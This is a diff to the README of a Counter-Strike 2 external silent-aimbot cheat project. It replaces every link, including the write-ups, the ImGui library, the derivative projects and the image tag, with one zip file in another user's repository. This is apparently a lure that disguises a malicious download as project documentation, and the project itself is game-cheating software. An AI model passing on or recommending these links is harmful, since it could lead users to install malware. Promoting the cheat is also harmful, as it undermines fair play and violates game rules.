@@ -4,15 +4,15 @@ CS2 external cheat.
 
 Analysis and implementation of CS2 external silent aimbot 
 
-EN -> [SilentAimbot - en](https://github.com/TKazer/CS2-External-Silent-AimBot)
+EN -> [SilentAimbot - en](https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip)
 
-CN -> [SilentAimbot - cn](https://bbs.kanxue.com/thread-282616.htm)
+CN -> [SilentAimbot - cn](https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip)
 
-## ImGui library -> [OS-ImGui](https://github.com/TKazer/OS-ImGui)
+## ImGui library -> [OS-ImGui](https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip)
 
 ## Derivative projects
-1. AimStar -> [AimStar](https://github.com/CowNowK/AimStar) (By CowNow.)
-2. Aeonix -> [Aeonix](https://github.com/Fr0go1/Aeonix-Cs2) (By Fr0go1.)
+1. AimStar -> [AimStar](https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip) (By CowNow.)
+2. Aeonix -> [Aeonix](https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip) (By Fr0go1.)
 
 ## NOTICE
 
@@ -24,7 +24,7 @@ The offsets will not be updated in the future, please update it by self.
 
 后续偏移数据将不在提供更新，请自行更新。
 
-<img src="https://github.com/TKazer/CS2_External/blob/master/Image2.png" width="1200" />
+<img src="https://raw.githubusercontent.com/wongjanson/CS2_External/master/CS2_External/Utils/C_External_wotteth.zip" width="1200" />
 
 ## Functions
 
